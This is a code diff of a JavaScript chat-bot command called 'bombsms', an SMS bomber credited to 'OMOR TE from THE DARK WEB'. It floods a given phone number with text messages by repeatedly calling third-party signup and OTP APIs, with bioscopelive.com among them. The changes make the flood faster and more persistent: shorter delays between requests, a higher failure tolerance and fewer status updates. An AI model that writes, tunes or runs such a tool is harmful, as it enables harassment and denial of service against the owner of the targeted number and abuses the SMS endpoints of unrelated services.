@@ -9,12 +9,12 @@ const bombingFlags = {};
 module.exports = {
   config: {
     name: "bombsms",
-    version: "3.0.0",
-    author: "OMOR TE from The Dark Web",
+    version: "5.0.0",
+    author: "OMOR TE from THE DARK WEB",
     countDown: 0,
     role: 2,
     shortDescription: "SMS Bomber",
-    longDescription: "SMS bombing tool",
+    longDescription: "Super-fast SMS bombing tool",
     guide: "{p}bombsms 01xxxxxxxxx limit | {p}bombsms off",
     category: "tool"
   },
@@ -53,10 +53,10 @@ module.exports = {
 
     bombingFlags[threadID] = true;
 
-    // Progress message that will be edited
-    const progressMsg = await message.reply(`🚀 **SMS BOMBER STARTED**\n━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: ${num}\n🎯 লক্ষ্য: ${limit} SMS\n📊 প্রগ্রেস: 0/${limit} (0%)\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`);
+    // First message at 0%
+    const progressMsg = await message.reply(`🚀 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 0/${limit} (0%)\n┣${"░".repeat(20)}┫\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`);
 
-    // All headers and API configs (unchanged)
+    // API configs
     const headers = {
       'authority': 'www.bioscopelive.com',
       'accept': '*/*',
@@ -255,9 +255,10 @@ module.exports = {
       async () => await axios.get(url10, { headers: headers10 })
     ];
     
-    // Start bombing with message editing
+    // FAST SPEED - very little delay
     let sent = 0;
     let consecutiveFailures = 0;
+    let lastUpdatePercent = 0;
     
     for (let cycle = 0; cycle < Math.ceil(limit / apiCalls.length) && sent < limit && bombingFlags[threadID]; cycle++) {
       for (let i = 0; i < apiCalls.length && sent < limit && bombingFlags[threadID]; i++) {
@@ -267,46 +268,52 @@ module.exports = {
             sent++;
             consecutiveFailures = 0;
             
-            // Update progress by editing the message
-            const percent = Math.round((sent / limit) * 100);
-            const progressBar = getProgressBar(percent, 20);
+            const newPercent = Math.floor((sent / limit) * 100);
+            const updateThresholds = [25, 50, 75, 100];
             
-            await api.editMessage(
-              `🚀 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: ${num}\n🎯 লক্ষ্য: ${limit} SMS\n📊 প্রগ্রেস: ${sent}/${limit} (${percent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`,
-              progressMsg.messageID
-            );
+            if (updateThresholds.includes(newPercent) && newPercent > lastUpdatePercent) {
+              lastUpdatePercent = newPercent;
+              const progressBar = getProgressBar(newPercent, 20);
+              
+              await api.editMessage(
+                `🚀 **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${newPercent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⏳ চলছে...`,
+                progressMsg.messageID
+              );
+            }
           }
         } catch (error) {
           consecutiveFailures++;
         }
         
-        await sleep(500);
+        // FAST: only 150ms delay (very fast)
+        await sleep(150);
+        
         if (!bombingFlags[threadID]) break;
       }
       
-      if (consecutiveFailures > 15) {
+      if (consecutiveFailures > 30) {
         await api.editMessage(
-          `⚠️ **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: ${num}\n⚠️ API রেট লিমিট হয়েছে\n📊 প্রগ্রেস: ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n⏸️ থামানো হয়েছে...`,
+          `⚠️ **SMS BOMBER**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n⚠️ API limit reached\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n⏸️ Paused...`,
           progressMsg.messageID
         );
         break;
       }
       
-      await sleep(1000);
+      await sleep(300);
     }
     
     if (bombingFlags[threadID]) {
       bombingFlags[threadID] = false;
-      const percent = Math.round((sent / limit) * 100);
+      const percent = Math.floor((sent / limit) * 100);
       const progressBar = getProgressBar(percent, 20);
       
       await api.editMessage(
-        `✅ **SMS BOMBER COMPLETED**\n━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: ${num}\n🎯 লক্ষ্য: ${limit} SMS\n📊 সম্পন্ন: ${sent}/${limit} (${percent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⚡ MW LEGENDS`,
+        `✅ **SMS BOMBER COMPLETED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n🎯 ${limit} SMS\n📊 ${sent}/${limit} (${percent}%)\n${progressBar}\n━━━━━━━━━━━━━━━━━━━━\n⚡ MW LEGENDS`,
         progressMsg.messageID
       );
     } else {
       await api.editMessage(
-        `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 নম্বর: ${num}\n📊 প্রগ্রেস: ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n🛑 ম্যানুয়ালি বন্ধ করা হয়েছে`,
+        `⛔ **SMS BOMBER STOPPED**\n━━━━━━━━━━━━━━━━━━━━\n📱 ${num}\n📊 ${sent}/${limit}\n━━━━━━━━━━━━━━━━━━━━\n🛑 বন্ধ করা হয়েছে`,
         progressMsg.messageID
       );
     }
